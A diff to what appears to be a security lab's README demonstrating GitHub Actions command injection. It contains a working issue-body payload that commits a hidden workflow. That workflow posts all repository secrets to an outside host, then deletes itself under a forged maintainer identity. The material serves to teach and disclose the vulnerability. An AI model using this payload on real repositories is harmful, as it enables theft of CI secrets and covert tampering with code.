@@ -74,13 +74,13 @@ The issue title for the demo:
 
  ```bash
 # Send as issue body because issue title is capped at the character limit
-" && curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/alex-tipper/demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"bmFtZTogRXhwb3NpbmcgQUxMIFNlY3JldHMKCm9uOgogIHdvcmtmbG93X3J1bjoKICAgIHdvcmtmbG93czogWyJWdWxuIl0KCmpvYnM6CiBidWlsZDoKICAgcnVucy1vbjogdWJ1bnR1LWxhdGVzdAoKICAgc3RlcHM6CiAgICAgLSBydW46IHwKICAgICAgICAgZWNobyAiJHt7IHRvSlNPTihzZWNyZXRzKSB9fSIgPiAuc2VjcmV0cwogICAgICAgICBjdXJsIC1YIFBPU1QgLS1kYXRhICJALnNlY3JldHMiIGh0dHA6Ly8zNC4xMjEuMzQuOTc6NjQzNzUKICAgICAtIHJ1bjogfAogICAgICAgICBTSEE9JChjdXJsIC1YIEdFVCAtSCAiQXV0aG9yaXphdGlvbjogVG9rZW4gJHt7IGdpdGh1Yi50b2tlbiB9fSIgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9hbGV4LXRpcHBlci9kZW1vL2NvbnRlbnRzLy5naXRodWIvd29ya2Zsb3dzL2lubm9jZW50X3dvcmtmbG93LnltbCAtcyB8IGpxIC1yIC5zaGEpCiAgICAgICAgIGN1cmwgLVggREVMRVRFIC1IICJBdXRob3JpemF0aW9uOiBUb2tlbiAke3sgZ2l0aHViLnRva2VuIH19IiBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL2FsZXgtdGlwcGVyL2RlbW8vY29udGVudHMvLmdpdGh1Yi93b3JrZmxvd3MvaW5ub2NlbnRfd29ya2Zsb3cueW1sIC1kICd7Im1lc3NhZ2UiOiJpbm5vY2VudCBjb21taXQgbWVzc2FnZSIsImNvbW1pdHRlciI6eyJuYW1lIjoiTWFpbnRhaW5lciBOYW1lIiwiZW1haWwiOiJtYWludGFpbmVyQGdtYWlsLmNvbSJ9LCAic2hhIjoiJyIke1NIQX0iJyJ9JyA="}' && echo "
+" && curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/CycodeLabs/gh-injection-vuln-demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"bmFtZTogRXhwb3NpbmcgQUxMIFNlY3JldHMKCm9uOgogIHdvcmtmbG93X3J1bjoKICAgIHdvcmtmbG93czogWyJWdWxuIl0KCmpvYnM6CiBleHBvc2Vfc2VjcmV0czoKICAgcnVucy1vbjogdWJ1bnR1LWxhdGVzdAoKICAgc3RlcHM6CiAgICAgLSBydW46IHwKICAgICAgICAgZWNobyAiJHt7IHRvSlNPTihzZWNyZXRzKSB9fSIgPiAuc2VjcmV0cwogICAgICAgICBjdXJsIC1YIFBPU1QgLS1kYXRhICJALnNlY3JldHMiIGh0dHA6Ly9sYWIuY3ljb2RlLmNvbTo2NDM3NQogICAgIC0gcnVuOiB8CiAgICAgICAgIFNIQT0kKGN1cmwgLVggR0VUIC1IICJBdXRob3JpemF0aW9uOiBUb2tlbiAke3sgZ2l0aHViLnRva2VuIH19IiBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL0N5Y29kZUxhYnMvZ2gtaW5qZWN0aW9uLXZ1bG4tZGVtby9jb250ZW50cy8uZ2l0aHViL3dvcmtmbG93cy9pbm5vY2VudF93b3JrZmxvdy55bWwgLXMgfCBqcSAtciAuc2hhKQogICAgICAgICBjdXJsIC1YIERFTEVURSAtSCAiQXV0aG9yaXphdGlvbjogVG9rZW4gJHt7IGdpdGh1Yi50b2tlbiB9fSIgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9DeWNvZGVMYWJzL2doLWluamVjdGlvbi12dWxuLWRlbW8vY29udGVudHMvLmdpdGh1Yi93b3JrZmxvd3MvaW5ub2NlbnRfd29ya2Zsb3cueW1sIC1kICd7Im1lc3NhZ2UiOiJpbm5vY2VudCBjb21taXQgbWVzc2FnZSIsImNvbW1pdHRlciI6eyJuYW1lIjoiTWFpbnRhaW5lciBOYW1lIiwiZW1haWwiOiJtYWludGFpbmVyQGdtYWlsLmNvbSJ9LCAic2hhIjoiJyIke1NIQX0iJyJ9JyA="}' && echo "
  ```
 
 This payload consists of the following command:
 
 ```bash
-curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/alex-tipper/demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"bmFt..."}'
+curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/CycodeLabs/gh-injection-vuln-demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"bmFt..."}'
 ```
 
 The content is base64 encoding of the workflow we want to commit:
@@ -92,6 +92,13 @@ on:
   workflow_run:
     workflows: ["Vuln"]
 
+env:
+  WORKFLOW_NAME: "innocent_workflow.yml"
+  MAINTAINER_EMAIL: "maintainer@gmail.com"
+  MAINTAINER_NAME: "Maintainer Name"
+  COMMIT_MESSAGE: "innocent commit message"
+  URL: http://lab.cycode.com:64375
+
 jobs:
  build:
    runs-on: ubuntu-latest
@@ -99,10 +106,10 @@ jobs:
    steps:
      - run: |
          echo "${{ toJSON(secrets) }}" > .secrets
-         curl -X POST --data "@.secrets" http://lab.cycode.com:64375
+         curl -X POST --data "@.secrets" $URL
      - run: |
-         SHA=$(curl -X GET -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/alex-tipper/demo/contents/.github/workflows/innocent_workflow.yml -s | jq -r .sha)
-         curl -X DELETE -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/alex-tipper/demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"}, "sha":"'"${SHA}"'"}' 
+         SHA=$(curl -X GET -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -s | jq -r .sha)
+         curl -X DELETE -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -d '{"message":"$COMMIT_MESSAGE","committer":{"name":"$MAINTAINER_NAME","email":"$MAINTAINER_EMAIL"}, "sha":"'"${SHA}"'"}' 
 ```
 
 So the procedure of the demo is the following:
